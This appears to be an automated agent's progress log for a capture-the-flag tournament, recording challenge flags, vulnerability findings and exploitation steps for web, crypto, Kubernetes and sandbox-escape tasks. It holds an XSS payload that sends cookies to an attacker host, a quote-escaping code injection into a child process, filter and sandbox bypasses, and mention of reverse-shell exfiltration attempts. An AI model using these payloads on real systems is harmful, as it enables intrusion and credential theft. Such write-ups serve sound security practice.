       `cf81bd448959023e12143d230ae791acb4e0c0c6ac293c09de42fda4201209f3`
     - Computed `ConfigKeyHash` as $\text{SHA256}(\text{url} + \text{ConfigKey})$:
       `e029cd52cc7eb5fe08e12c48e57e8728c82baf2d30c11642b27ca1416c9a3f0b`
  3. **Bypass & Flag Recovery**:
     - Sent HTTP GET request to `/exam` with header:
       `X-SafeExamBrowser-ConfigKeyHash: e029cd52cc7eb5fe08e12c48e57e8728c82baf2d30c11642b27ca1416c9a3f0b`
     - Server returned HTTP 200 with the exam question HTML containing the hardcoded flag directly inside `<script>`:
       `NNS{5ay_cH335e_4Nd_sm113_foR_7h3_1ockD0wn_BRoW5eR_and_HoPe_that_You_get_the_Corr3ct_answ3r_s0M3H0w}`
- **Status**: Solved & Submitted ✔ Container stopped.

---

## Postponed Challenge: `web_dont-worry`
- **Category**: Web Exploitation / Client-side DOM & Admin Bot
- **Points**: 207 | **Solves**: 20+
- **Targets & Endpoints**:
  - Live instance: `https://dont-worry-f07945033e5b.chall.nnsc.tf:443`
  - Admin bot integration: `POST /api/v2/integrations/challs/web_dont-worry/admin-bot`
  - Body structure: `{"inputs": {"url": "^/..."}}`
- **Technical Architecture & Vulnerability Findings**:
  1. **Document Management API**:
     - `POST /api/documents/{id}?key={key}` creates/updates document with `{ title, body, language }`.
     - `GET /api/documents/{id}?key={key}&view=reader` returns `{ id, title, body, language }`.
     - `GET /d/{id}#{key}` is the reader view rendered by `/static/reader.js`.
  2. **Client-side DOM XSS**:
     - In `reader.js`:
       ```javascript
       fetch(`/api/documents/${id}?key=${encodeURIComponent(key)}&view=reader`)
         .then(res => res.json())
         .then(data => {
           document.title = data.title;
           doc.innerHTML = data.body;
           Prism.highlightAllUnder(doc);
         });
       ```
     - Direct sink: `doc.innerHTML = data.body` without sanitization.
  3. **Target Asset**:
     - Pinned document on index: `<li><a href="/d/welcome">welcome</a></li>`.
     - `/api/documents/welcome` without key returns `{"error":"forbidden"}`.
     - Admin bot possesses the key to `/welcome` or has the flag in cookies/localStorage.
- **Status**: Postponed per user directive. Container stopped.

---

## Solved Challenge: `web_perchance`
- **Category**: Web Exploitation / WebExtension Content Script Injection & URL Userinfo Bypass
- **Points**: 213 (dynamically scaled) | **Solves**: ~44
- **Flag**: `NNS{PerHap5_YoU_migh7_po551b1y_3nJoY_c7f5_PeRcHanCe}`
- **Analysis & Exploitation**:
  1. **URL Validation Bypass**:
     - The server route `/perchance` accepts a `url` parameter and checks:
       `if (!url || !url.startsWith('https://doc.rust-lang.org'))`
     - By supplying a URL with userinfo:
       `https://doc.rust-lang.org@<our-public-tunnel-host>/exploit?x=https://doc.rust-lang.org/`
       the string prefix check passes, while Firefox navigates to our tunnel server.
  2. **Extension Architecture & Insecure Configuration Storage**:
     - The challenge launches Firefox with a custom extension (fixed UUID `09a6c422-a354-447d-b4ea-185cb10be869`).
     - In `manifest.json`, `web_accessible_resources: ["*"]` permits any web origin to frame `options.html`.
     - In `options.js`, a `postMessage` event listener processes any message matching `/^https?/`:
       ```javascript
       if (!u.href.includes('https://doc.rust-lang.org/')) return;
       await browser.storage.local.set({ activateOn: u.origin });
       ```
     - Framing `options.html` and posting `https://<our-host>/?x=https://doc.rust-lang.org/` overwrites `activateOn` in `browser.storage.local` to our attacker origin.
  3. **Content Script Interception & XSS Injection**:
     - When navigation completes on our origin, `background.js` injects `assets/cs.js`.
     - `cs.js` reads `previous` from storage and writes: `elm.innerHTML = 'Previous: ' + prev;` (direct DOM XSS sink).
     - To update `previous`, `cs.js` appends `<script type="module">` importing `/jsxss.js`, assigns `window[nonce] = nonce`, and passes `location.href` to `window.wrappedJSObject[nonce](location.href)`.
     - Using a `MutationObserver` on our page, we detect the module script, extract the `nonce`, and use `Object.defineProperty(window, nonce, ...)` to return our malicious payload:
       `<img src=x onerror="navigator.sendBeacon('<our-host>/flag?c='+encodeURIComponent(document.cookie));">`
     - `cs.js` transmits this payload to `background.js`, storing it into `previous`.
  4. **Target Execution & Exfiltration**:
     - Our page sends a second `postMessage('https://doc.rust-lang.org/', '*')` to `options.html` to reset `activateOn` back to `https://doc.rust-lang.org`.
     - Our page navigates to `https://doc.rust-lang.org/stable/std/`.
     - `cs.js` is injected into the standard library documentation page, renders `previous` into `elm.innerHTML`, executing the XSS payload.
     - The flag stored in non-HttpOnly cookie `flag` on domain `doc.rust-lang.org` is exfiltrated to our server:
       `NNS{PerHap5_YoU_migh7_po551b1y_3nJoY_c7f5_PeRcHanCe}`.
- **Status**: Solved & Submitted ✔ Container stopped.

---

## Postponed Challenge: `devsecoops_Triangle platform`
- **Category**: DevSecOps / Kubernetes Operator & Kyverno Policy Bypass
- **Points**: 253 | **Solves**: ~15
- **Targets & Endpoints**:
  - Front proxy routes:
    - `/internal/` -> registry (`http://127.0.0.1:8080`)
    - All other paths (`/apis/...`, `/api/v1/...`) -> Kubernetes API server with injected `console` (`tenant-a`) token.
- **Technical Architecture & Vulnerability Findings**:
  1. **Flag Location & Secret Injection**:
     - Flag is created in `bootstrap.sh`: `kubectl -n triangle-origins create secret generic origin-acme-invoices.sites.triangle.tld --from-literal="FLAG=${FLAG}"`.
     - In `operator/domain.go:syncOriginConfig`: when a `site` has a served claim `c`, the operator gets `origin-` + `canonicalHost(c.host)` from namespace `triangle-origins` and copies it into `<site.name>-origin` in the site's own namespace (`tenant-a`).
     - In `operator/render.go`: if `originSecret != ""`, it mounts `<site.name>-origin` at `/var/run/origin` in the Nginx pod.
  2. **Arbitrary File Read via Nginx Proxy**:
     - Verified working: `console` can create/patch `Site` custom resources in `tenant-a`.
     - Changing `server.root: /var/run/...` and `server.index: ...` in `siteYAML` allows reading any file inside the Nginx container via `GET /api/v1/namespaces/tenant-a/services/<name>:http/proxy/`.
  3. **Domain Ownership / Collision Mechanism**:
     - Flag secret is keyed to `acme-invoices.sites.triangle.tld`.
     - In `tenant-b`, `Domain` CR `tenant-b-acme-invoices` already holds `host: acme-invoices.sites.triangle.tld`, pointing to `tenant-b/invoices`.
     - Creating a site named `acme-invoices` in `tenant-a` is blocked by `claimZoneHost`: `c.host == host && c.site != ref` prevents claiming the same zone host.
  4. **Privilege Escalation Vector**:
     - ServiceAccount `tri-edge` in `tenant-a` has `Role` `triangle-edge` in `triangle-system` (can `create`, `get` secrets).
     - ServiceAccount `tri-registry-sync` in `triangle-system` has `ClusterRole` `triangle:registry-sync` (can `create`, `get`, `list`, `watch` cluster-scoped `domains`).
     - With `tri-edge`, an attacker can create a service account token secret for `tri-registry-sync` in `triangle-system`, obtain the token, and create arbitrary `Domain` CRs cluster-wide.
     - `render.go` sets pod `serviceAccountName: tri-edge` if `integrations: [edge]` is present in `siteYAML`.
     - Kyverno policy `site-integration-entitlement` blocks `integrations` unless included in `['forms', 'analytics']`.
- **Status**: Postponed per user directive. Container stopped.

---

## Solved Challenge: `misc_happy`
- **Category**: Misc / Node.js happy-dom VM Escape & RCE
- **Points**: 274 | **Solves**: ~14
- **Flag**: `NNS{7Fw_Y0u_c0N5ole._57Dout_F0R_11Ke_tHe_bi1lionth_tiMe}`
- **Analysis & Exploitation**:
  1. **Sandbox Environment**:
     - Service ran Node 24 (`node:24-alpine`) with:
       `node --disallow-code-generation-from-strings --frozen-intrinsics /home/jail/chal.js`
     - Evaluated input URL with `happy-dom@20.11.2`:
       `const browser = new Browser({settings: {enableJavaScriptEvaluation: true}, console: global.console});`
     - Readflag binary `/readflag` (`0111`) required passphrase:
       `According to all known laws of aviation, there is no way that a bee should be able to FLY. Its wings are too small to get its fat little body off the ground. The bee, of course, flies anyways. Because BEES don't care what humans think is impossible.`
  2. **Vulnerability Discovery in happy-dom**:
     - While ECMA-262 intrinsics were frozen by `--frozen-intrinsics`, happy-dom's own classes (`window.Request`, `window.URL`, `window.XMLHttpRequest`) were not frozen.
     - When synchronous `XMLHttpRequest.send()` is invoked, happy-dom executes `SyncFetch`, which spawns a separate child process using:
       `ChildProcess.execFileSync(process.argv[0], ['-e', script], ...)`
     - In `SyncFetchScriptBuilder.getScript`, the script template interpolates `request.body.toString('base64')` directly inside single quotes:
       `request.write(Buffer.from('${request.body ? request.body.toString('base64') : ''}', 'base64'));`
     - Critically, this child Node process is spawned **without** `--frozen-intrinsics` or `--disallow-code-generation-from-strings`!
  3. **Exploit Vector**:
     - Overrode `window.Request` subclassing the original `Request`.
     - Attached a custom object to symbol `bodyBuffer` with `toString()` returning code that escapes the single quotes:
       `', 'base64')); const cp = require('child_process'); ... process.exit(0); //`
     - The child process ran `/readflag` with the exact passphrase, base64-encoded the flag, and returned it in the HTTP response JSON.
     - `xhr.responseText` received the flag and `console.log` printed it directly through `chal.js`'s terminal output:
       `NNS{7Fw_Y0u_c0N5ole._57Dout_F0R_11Ke_tHe_bi1lionth_tiMe}`.
- **Status**: Solved & Submitted ✔ Container stopped.

---

## Postponed Challenge: `web_File Monster`
- **Category**: Web Exploitation / Bun & MongoDB
- **Points**: 286 | **Solves**: ~14
- **Targets & Endpoints**:
  - Live instance: Dynamic container on port 3000 (Bun) and 27017 (MongoDB).
- **Technical Architecture & Vulnerability Findings**:
  1. **Upload Mechanism**:
     - File upload route `/` accepts multipart form uploads.
     - Files are saved to `/tmp/${file.name}`.
     - Filename sanitization: `FLAG` is replaced with the actual flag string from the environment, and quotes (`"`, `'`, '`') are removed.
  2. **MongoDB / File Storage**:
     - MongoDB 8.2.10 runs locally on port 27017 (`file-monster` DB, `files` collection).
     - Potential vectors: Mongo file injection / BSON parsing / Bun file handling path traversal or overwrite.
- **Status**: Postponed per tournament strategy / user directive. Container stopped.

---

## Solved Challenge: `misc_The Temple`
- **Category**: Misc / TempleOS Hardware Probing & HolyC Disk Mounting
- **Points**: 299 | **Solves**: ~14
- **Flag**: `NNS{a_60D1y_Ho1Y_50metH1ng_s0M3tHin6_oPeRa7iN6_5ys73m_tH4t_ruN5_1N_Ring_0_1s_sUch_a_BeautY}`
- **Analysis & Exploitation**:
  1. **Environment Setup & Access**:
     - Remote WebSockify VNC endpoint attached to a QEMU VM running TempleOS V5.03 Live CD.
     - Built an async TCP-to-WebSocket bridge to expose the RFB stream on localhost `127.0.0.1:5999`.
     - Automated headless navigation and keystroke injection via `vncdotool` with `--force-caps`.
  2. **Device Discovery & Filesystem Mounting**:
     - Initial drive status (`DrvRep;`) showed only Live CD (`T:`) and RAM drive (`B:`).
     - Executed `ATARep;` hardware probe, revealing:
       - Device `1`: Hard Drive ATA Primary IDE (`Base0:0x01F0`, `Base1:0x03F4`, `Unit:0`).
       - Device `2`: CD/DVD ATAPI Secondary IDE (`Base0:0x0170`, `Base1:0x0374`, `Unit:0`).
     - Launched `Mount;` interactive wizard:
       - Assigned drive letter: `C`
       - Partition: All
       - Probed ATA devices and selected device `1`.
       - Drive `C:` mounted successfully as FAT32 QEMU Harddisk.
  3. **Flag Retrieval**:
     - Switched drive via HolyC statement `Drv(67);` (ASCII code 67 for 'C').
     - Listed directory `Dir;`, revealing file `FLAG.TXT` (92 bytes).
     - Printed contents with `Type("FLAG.TXT");`.
     - Extracted character-exact 8x8 font bitmap to verify leetspeak ambiguities (`60D1y`, `Ho1Y`, `1N`, `1s`, `BeautY`):
       `NNS{a_60D1y_Ho1Y_50metH1ng_s0M3tHin6_oPeRa7iN6_5ys73m_tH4t_ruN5_1N_Ring_0_1s_sUch_a_BeautY}`
- **Status**: Solved & Submitted ✔ Container stopped.

---

## Solved Challenge: `misc_Dot matrix`
- **Category**: Misc / Hardware & Signal Analysis (AS1130 LED Matrix Controller)
- **Points**: 263 (dynamically scaled 158) | **Solves**: 46+
- **Flag**: `NNS{FL4G-SCR0LL1NG-PA5T-0N-TH3-DOT-MATR1X}`
- **Challenge Files**:
  - `as1130.logicdata`: Saleae Logic capture of I2C bus controlling an AS1130 132-LED cross-plexing driver.
  - `pinout.txt`: 7x17 pinout table mapping LED grid coordinates $(r, c)$ to Anode ($A0-A9$) and Cathode ($C0-C11$) lines.
  - `dot-matrix.png`: Reference photograph of the 7x17 LED matrix module showing initial frame ("NNS{").
- **Analysis & Exploitation**:
  1. **Capture De-serialization**:
     - Converted `as1130.logicdata` via patched Saleae Logic 1.2.29 socket automation to `/tmp/dotmatrix.csv`.
     - Decoded I2C protocol at 400 kHz: Device address `0x30` (write `0x60`).
  2. **Frame Extraction & Display Geometry**:
     - AS1130 register `0x01` sets active memory page. Page `0x40` is the PWM intensity block.
     - Extracted 705 consecutive PWM frames (132 bytes per frame starting at register `0x18`).
     - Display mapping formula: $\text{byte\_index} = C \times 11 + A$.
     - Spatial orientation requires flipping along both axes: $\text{display\_pixel}(x, y) = (16 - c, 6 - r)$.
  3. **Banner Reconstruction & OCR Transcription**:
     - Determined that the message scrolls left by 1 pixel every 3 frames (keyframes at frames $7, 10, 13, \dots, 705$).
     - Stitched all 233 keyframe updates into a continuous 7x249 binary pixel banner.
     - Extracted all 42 individual character segments from the 5x7 bitmap font.
     - Confirmed slashed zero `0` vs letter `O` (`SCR0LL1NG`, `0N` use `0`, while `DOT` uses `O`), leetspeak digits (`4`, `5`, `1`, `3`), and hyphens `-` for word separation:
       `NNS{FL4G-SCR0LL1NG-PA5T-0N-TH3-DOT-MATR1X}`
- **Status**: Solved & Submitted ✔

---

## Solved Challenge: `crypto_Crypto Party 2`
- **Category**: Cryptography / ECDSA Biased Nonces & Structured UUID Lattice Reduction
- **Points**: 152 (dynamically scaled 106) | **Solves**: 61+
- **Flag**: `NNS{bu7_uu1ds_4r3_r4nd0m!!_9ee8b4fc9e}`
- **Challenge Files & Source**:
  - `chall.py`: Python ECDSA service on curve NIST256p.
  - Secret key `secret_key` encrypts flag with AES-128-ECB (`ct`).
  - Allows inviting up to `MAX_INVITES = 6` friends; for each name $m$, computes $h = \text{sha256}(m)$ and signs with nonce $k = \text{bytes\_to\_long}(\text{str(uuid.uuid4())[:32].encode()})$.
- **Analysis & Mathematical Formulation**:
  1. **UUIDv4 Nonce Structural Redundancy**:
     - String representation of `str(uuid.uuid4())[:32]` is 32 ASCII characters:
       `xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxx`
     - Fixed positions:
       - Hyphens `'-'` at indices 8, 13, 18, 23 (ASCII 45 = `0x2D`).
       - Version `'4'` at index 14 (ASCII 52 = `0x34`).
       - Variant `'y'` at index 19 is in `{'8', '9', 'a', 'b'}` (ASCII 56, 57, 97, 98, centered at 77, $\Delta \le 21$).
       - Remaining 26 positions are hex digits `'0'..'9', 'a'..'f'` (ASCII 48..57, 97..102, centered at 75, $\Delta \le 27$).
     - Let $W_j = 256^{31-j} \bmod n$. The nonce is:
       $$k_i = K_{\text{fixed}} + \sum_{j \in \text{Unknown}} W_j x_{i, j} \pmod n$$
       where $|x_{i, j}| \le 27$ for all 27 unknown byte positions per signature!
  2. **Eliminating the Secret Key**:
     - ECDSA relation: $k_i \equiv A_i d + B_i \pmod n$, where $A_i = s_i^{-1} r_i \bmod n$, $B_i = s_i^{-1} h_i \bmod n$.
     - Using signature 0: $d \equiv A_0^{-1} (k_0 - B_0) \pmod n$.
     - For $i = 1, \dots, 5$:
       $$\sum_{j} W_j x_{i, j} - \sum_{j} (A_i A_0^{-1} W_j \bmod n) x_{0, j} \equiv V_i \pmod n$$
       where $V_i = (B_i - T_i B_0 - (1 - T_i) K_{\text{fixed}}) \bmod n$.
     - This gives 5 linear modular equations across $6 \times 27 = 162$ bounded variables ($|x| \le 27$).
  3. **Lattice Reduction (Kannan Embedding / CVP)**:
     - Constructed a $168 \times 168$ integer matrix with scaling factor $K = 2^{60}$ on modular relations and target bound 27 on the embedding vector.
     - Reduced via `fpylll.LLL` in **1.99 seconds**!
     - The target vector $(\mathbf{x}, \mathbf{0}, 27)$ appeared directly in the reduced basis, recovering all nonce bytes $x_{0, j}$.
  4. **Key Recovery & Decryption**:
     - Reconstructed $k_0$, computed $d \equiv r_0^{-1} (s_0 k_0 - h_0) \bmod n$.
     - Derived AES key `long_to_bytes(d, 32)` and decrypted `ct`:
       `NNS{bu7_uu1ds_4r3_r4nd0m!!_9ee8b4fc9e}`.
- **Status**: Solved & Submitted ✔ Container stopped.

---

## Solved Challenge: `web_File Monster`
- **Category**: Web / Misc (Bun.js & MongoDB 8.2 Engine Dynamic Module Execution)
- **Points**: 124 | **Solves**: 47+
- **Flag**: `NNS{g0oD_j0B_6et7iN6_this_745tY_f146_Fr0M_th3_Fl46_mon5ter}`
- **Challenge Architecture & Source Code**:
  - Web service running Bun.js: `POST /upload` writes uploaded file to `/tmp/${file.name}` after stripping quotes (`"`, `'`, `` ` ``) and replacing string `FLAG` with `process.env.FLAG`.
  - MongoDB 8.2.10 running in the same container with `viewer:viewer` read-only user on `file-monster` database exposed over TLS.
- **Analysis & Exploitation**:
  1. **SpiderMonkey JS Engine in MongoDB 8.2**:
     - MongoDB uses `mozjs` (SpiderMonkey) for JavaScript evaluation (`$function` inside aggregation pipelines).
     - SpiderMonkey supports dynamic `import("/tmp/${file.name}")`.
     - When importing a local JavaScript module, top-level code executes synchronously during module evaluation, enabling arbitrary side effects on `globalThis`.
  2. **Quote-Stripping Bypass via Function.prototype.toString()**:
     - Stripping quotes prevents string literals, and regex literals `/FLAG/` can fail if the flag contains special characters like forward slashes or invalid quantifiers.
     - However, a multi-line comment `/* FLAG */` inside a function body is immune to all syntax errors and requires zero quotes:
       ```javascript
       function getFlag() {
       /* FLAG */
       }
       globalThis.FLAG_LEAK = getFlag.toString();
       ```
  3. **Flag Retrieval**:
     - Uploaded `solveflag.js` to `/upload`. The server replaced `FLAG` with the real flag inside the comment.
     - Connected to MongoDB TLS service and executed aggregation with `$function`:
       ```javascript
       import("/tmp/solveflag.js");
       return globalThis.FLAG_LEAK;
       ```
     - Extracted flag: `NNS{g0oD_j0B_6et7iN6_this_745tY_f146_Fr0M_th3_Fl46_mon5ter}`.
- **Status**: Solved & Submitted ✔ Container stopped.

---


## Postponed / Paused Challenge: `misc_dyslexic`
- **Category**: Misc (`0day`, `beginner`)
- **Points**: 90 | **Solves**: 84
- **Description**: "I can't read. The flag is located at /challenge/flag.txt. This is a 0day challenge and we are hoping you keep this 0day to yourself until the vulnerabilities are patched."
- **Status Log**: Container initialization failed on platform (`❌ Khởi tạo thất bại: None`). Postponed in accordance with pipeline instructions.

---

## Postponed Challenge: `misc_Keyboard`
- **Category**: Misc / Hardware USB Signal Decoding
- **Points**: 125 | **Solves**: 46
- **Files**: `keyboard.logicdata` (Saleae Logic capture of USB D+/D- lines)
- **Technical Analysis & Progress**:
  - Decoded USB NRZI transitions, unstuffed bits, and framed USB HID data packets (0x80 prefix, report type 0xc3 / 0x4b).
  - Recovered Norwegian key mapping sequence with cursor actions (HOME, END, LEFT, RIGHT, BACKSPACE, DELETE, INSERT).
  - Draft buffer simulation produced candidate flag with Norwegian leetspeak characters.
  - Postponed to continue tournament pipeline per user directive.
- **Status**: Postponed per tournament strategy / user directive.

---

## Postponed Challenge: `web_Ein milljón bjóra`
- **Category**: Web / C# ASP.NET Core & ClickHouse Binary Protocol Stream Desync
- **Points**: 122 | **Solves**: 48
- **Technical Vulnerability & Exploit Analysis**:
  1. **Goal**:
     - `GET /api/stats` returns the flag when `counted = sumIf(amount, approved) >= 1_000_000`.
  2. **Vulnerability in ClickHouse.Driver & Exif.cs**:
     - In `Exif.cs`, reading `location` from JSON UserComment returns `tagged` as a `System.Text.Json.JsonElement` instead of `Tuple.Create(x, y)`.
     - In `ClickHouse.Driver` (`PointType` / `TupleType.Write`), if the object is neither `ITuple` nor `IList`, `Write` does nothing and writes **0 bytes** to the `RowBinary` binary stream!
     - This shifts the binary stream by 16 bytes (size of `Point = (Float64, Float64)`):
       - ClickHouse consumes `amount` (4 bytes `01 00 00 00`) + length byte of `classification` + first 3 bytes of `classification` string as `location.1` (Float64).
       - Next 8 bytes of `classification` are consumed as `location.2` (Float64).
       - Next 4 bytes of `classification` ($S[11..14]$) are consumed as **`amount` (UInt32)**!
       - Next byte ($S[15]$) is consumed as string length $K = N - 16$.
       - The remaining $K$ bytes of $S$ are consumed as `classification`.
       - The final byte written by C# (`approved = 1`) aligns perfectly as `approved = true` in ClickHouse.
     - Placing ASCII characters at $S[11..14]$ (e.g. `beer`) yields `amount = 1,919,247,714` (> 1.9 billion), instantly triggering the flag threshold `FlagAt = 1_000_000`.
  3. **VLM Classifier**:
     - The backend uses `lusxvr/nanoVLM-230M-8k` to classify whether the photo contains beer. Prompt injection / text rendering on image can control the output text to match the length requirements.
  4. **Status Log**:
     - Container initialization failed on CTF server (`❌ Khởi tạo thất bại: None`).
- **Status**: Postponed per tournament strategy / user directive. Container failed to start.

---

## Postponed Challenge: `blockchain_Bank of NNS`
- **Category**: Blockchain / Mina & Kimchi Zero-Knowledge Proofs
- **Points**: 129 | **Solves**: 44
- **Files & Binaries**:
  - Codebase: `CTF_Workspace/blockchain/Bank_of_NNS/challenge/blockchain_bank-of-nns/`
  - Prover binary built: `target/release/nns-prove`
  - Circuit logic: `src/circuit.rs`, Server logic: `src/server.rs`
- **Technical Vulnerability & Circuit Analysis**:
  1. **Goal**:
     - Empty the bank vault (`VAULT = 100,000,000,000,000,000,000,000` = $10^{23}$ NNS) through `SETTLE <amount> <proof>`.
     - When `vault == 0`, server yields the flag.
  2. **Circuit Constraints & Wire Permutation Defect (0day)**:
     - The circuit is intended to range-check `amount` to a 64-bit value using `extend_range_check`.
     - In `Connect::connect_64bit`:
       ```rust
       self.connect_cell_pair((start_row, 1), (start_row, 2));
       self.connect_cell_pair((start_row, 2), (zero_row, 0));
       self.connect_cell_pair((zero_row, 0), (start_row, 1));
       ```
     - Swapping wires 3 times in a triangular cycle causes cell `(start_row, 1)` to loop back to itself ($X \to X$), while `(start_row, 2)` and `(zero_row, 0)` form an isolated 2-cycle.
     - Consequently, `(start_row, 1)` (which was supposed to constrain the upper 64-bit limb to zero) is left unconstrained by the permutation argument!
  3. **Field Arithmetic & Settlement Progress**:
     - Remote instance was running at `bank-of-nns-de30241e9733.chall.nnsc.tf:1337`.
     - Successfully generated valid proofs using `nns-prove` and verified settlement commands with server:
       - Withdrew 2011 NNS, updating state to `BALANCE: 7989 NNS`, `VAULT: 99999999999999999997989 NNS`.
     - To bridge the remaining $10^{23}$, witness generation needs to inject non-zero values into the unconstrained limb `(start_row, 1)` or underflow the vault calculation.
- **Status**: Postponed per tournament strategy / user directive. Background bridge daemon killed. Log and binary preserved for resuming.

---

## Postponed Challenge: `devsecoops_The Builder`
- **Category**: DevSecOops / Docker Multi-Stage Build & Registry Ingestion
- **Points**: 95 | **Solves**: 75
- **Endpoints Discovered**:
  - Web UI / FastAPI: `https://the-builder-1f8e5cabd61d.chall.nnsc.tf/`
  - Unauthenticated OCI Registry: `https://the-builder-registry-1f8e5cabd61d.chall.nnsc.tf:443/v2/`
- **Technical Architecture & Findings**:
  1. **Dockerfile Generation**:
     ```dockerfile
     FROM debian:trixie-slim AS theme
     RUN --mount=type=secret,id=flag \
         cp /run/secrets/flag /flag.txt \
      && printf '%s' 'body{font:16px/1.6 system-ui;margin:3rem auto;max-width:44rem;padding:0 1rem}' \
           > /theme.css

     FROM page0 AS content0
     ...
     FROM cgr.dev/chainguard/nginx:latest AS site
     COPY --from=theme /theme.css /usr/share/nginx/html/theme.css
     COPY --from=content0 /page /usr/share/nginx/html/{location}
     ```
  2. **Attack Surface & Registry Ingestion**:
     - `the-builder-registry` allows open blob uploads and manifest puts (`HTTP 201 Created`).
     - Tag generation for `page0`: `tag = sha256(content)[:12]`. If `pages:<tag>` already exists in the registry, the server reuses the pre-existing OCI image rather than creating a new one.
     - `location` validation rejects whitespace/newlines but accepts path traversal sequences like `../` and `/`.
     - In the base image `cgr.dev/chainguard/nginx:latest`, `/usr/share/nginx/html` symlinks to `/var/lib/nginx/html`.
- **Status**: Postponed per tournament strategy / user directive. Remote instance cleanly terminated.

---

## Postponed Challenge: `web_dont-worry`
- **Category**: Web
- **Points**: 104 | **Solves**: 63
- **Description**: "Don't worry, be happy."
- **Admin Bot**: `adminBotInputs: {"url": {"pattern": "^/"}}`
- **Status Log**: Container initialization failed on CTF platform (`❌ Khởi tạo thất bại: None`). Postponed per tournament strategy / user directive.

---

## Postponed Challenge: `devsecoops_Triangle platform`
- **Category**: DevSecOops (Kubernetes, Kyverno, ttyd)
- **Points**: 124 | **Solves**: 47
- **Description**: "Triangle is the new cloud-native static site platform."
- **Files**: `devsecoops_triangle-platform.tar.gz` (Docker compose, Kyverno policies, CRDs, operator, ttyd web terminal on port 7681).
- **Status Log**: Container initialization failed on CTF platform (`❌ Khởi tạo thất bại: None`). Postponed per tournament strategy / user directive.

---

## Postponed Challenge: `crypto_Downhill`
- **Category**: Cryptography (NTRUSign transcript / gradient attack)
- **Points**: 176 | **Solves**: 27
- **Description**: "all it takes is finding the right way down"
- **Files**: `chall.sage` (NTRUSign $N=251, q=128$, AES-ECB encrypted flag with SHA256 of $f$, signing oracle with 500 signatures).
- **Status Log**: Container initialization failed on CTF platform (`❌ Khởi tạo thất bại: None`). Postponed per tournament strategy / user directive.

---

## Postponed Challenge: `blockchain_CERN`
- **Category**: Blockchain (Aztec L2 / Noir Zero Knowledge Smart Contracts)
- **Points**: 161 | **Solves**: 31
- **Description**: "CERN produces far more collision data than it can keep. Make sure yours can survive the ATLAS Trigger."
- **Files**: `cern.tar.gz` (Noir contracts `AtlasTrigger`, `DetectorInterface`, `FlagEmitter`, TypeScript test runner `solve.test.ts`).
- **Status Log**: Container initialization failed on CTF platform (`❌ Khởi tạo thất bại: None`). Postponed per tournament strategy / user directive.

---

## Postponed Challenge: `boot2root_git gud`
- **Category**: boot2root (Forgejo 15.0.7 / CVE-2026-60004 diffpatch hook injection)
- **Points**: 228
- **Description**: "git gud"
- **Findings & Status**:
  - Investigated CVE-2026-60004: diffpatch bare-clone hook injection via add/add merge conflict.
  - Concurrency race condition (3-5 simultaneous patch requests) successfully triggered add/add merge conflict (HTTP 500 error & significant execution delay confirming hook triggered).
  - Outbound exfiltration (reverse shell, curl/wget to webhook/external IP) failed due to container egress/network restrictions.
  - Exfiltration via local API/git push to localhost locked/hung due to Forgejo repo locks held during diffpatch.
- **Status**: Postponed per tournament strategy / user directive.

## Postponed Challenge: `pwn_jailnet`
- **Category**: Pwn / Sandbox Escape (Janet 1.41.2 Language Sandbox)
- **Points**: 161 | **Solves**: 31
- **Description**: "Welcome to Jailnet! A secure Janet execution environment."
- **Findings & Status**:
  - `server.janet` compiles user input AST under partial sandbox (`:asm :chroot :env :ffi :fs :hrtime :modules :net :signal :subprocess :threads :unmarshal`), sanitizes environment bindings (`debug*`, `fiber*`, `ev/*`, `file*`, `net/*`, `os/*`, `module/*`, etc.), then applies `(sandbox :all)` before executing the thunk fiber.
  - Input AST filter `forbidden-form?` rejects `:macro`, `:core/u64`, `:core/s64`, and nested tuples/structs.
  - Confirmed vulnerability in Janet 1.41.2: `os/open` with modes not containing `'r'` or `'w'` (e.g. `:a`, `""`, `:N`) bypasses `janet_sandbox_assert`, falling back to `O_RDWR`.
  - Confirmed leak: `(describe (ffi/trampoline))` leaks binary `.text` pointer.
  - Exploitation requires memory corruption / nan-boxing cfunction synthesis to call C functions or restore bindings since `os/*` functions were stripped from `env`.
  - Postponed per tournament strategy / user directive to prioritize remaining high-yield challenges.
- **Status**: Postponed per tournament strategy / user directive.

## Postponed Challenge: `web_bloatware.js`
- **Category**: Web (Next.js 16.2.11 / React 19 / minimalMode / cacheComponents)
- **Points**: 181 | **Solves**: 26
- **Description**: "Even in minimal mode, next.js is still bloated"
- **Findings & Status**:
  - Next.js 16.2.11 with custom server wrapper running with `minimalMode: true`, `customServer: false`, and `cacheComponents: true`.
  - Target binary `/readflag` requires passing bee movie quote to print flag.
  - Requires analyzing Next.js internal server minimalMode / cache / action routing to achieve code execution.
  - Postponed per tournament strategy / user directive to prioritize remaining challenges.
- **Status**: Postponed per tournament strategy / user directive.

## Postponed Challenge: `web_AgilePaste 3`
- **Category**: Web (FastAPI / Erlang ETF / Popcorn AtomVM Elixir WASM)
- **Points**: 220 | **Solves**: 19
- **Description**: "I heard that AgilePaste 1 & 2 were big hits! People kept asking for v3, but it never appeared. I became impatient and made my own."
- **Findings & Status**:
  - FastAPI backend parses base64 encoded Erlang ETF using `erlang-py` (`erlang.binary_to_term`), validates note fields (`title`, `body` text), and stores pastes.
  - Client loads AtomVM WebAssembly runtime with Elixir Popcorn framework (`bundle.avm`).
  - Extracted and analyzed BEAM modules: `AgilePaste.Application`, `AgilePaste.Note`, `AgilePaste.View`, `AgilePaste.Worker`, and `Popcorn.Wasm`.
  - Discovered `Popcorn.Wasm.with_wrapper` interpolates serialized JSON directly into JavaScript string evaluated via Emscripten.
  - Requires crafting client-side/WASM exploit payload for admin bot exfiltration.
  - Postponed per tournament strategy / user directive to prioritize remaining challenges.
- **Status**: Postponed per tournament strategy / user directive.

---

# ⏸ DANH SÁCH CHALLENGE TẠM DỪNG (POSTPONED CHALLENGES)
*Cập nhật tự động: Bỏ qua khi duyệt tournament queue, chuyển sang challenge khác.*

| STT | Challenge ID | Category | Points | Lý do / Trạng thái tạm dừng |
|---|---|---|---|---|
| 1 | `boot2root_Clean Sweep` | boot2root | 89 | Container đã tắt, firmware ECOVACS GoAhead CGI reverse phức tạp. |
| 2 | `misc_dyslexic` | misc | 90 | Container dynamic khởi tạo thất bại trên server (`❌ Khởi tạo thất bại: None`). |
| 3 | `misc_Keyboard` | misc | 125 | Logic capture USB HID signal giải mã cần calibrate layout bàn phím Na Uy. |
| 4 | `web_Ein milljón bjóra` | web | 122 | Container dynamic khởi tạo thất bại trên server (`❌ Khởi tạo thất bại: None`). |
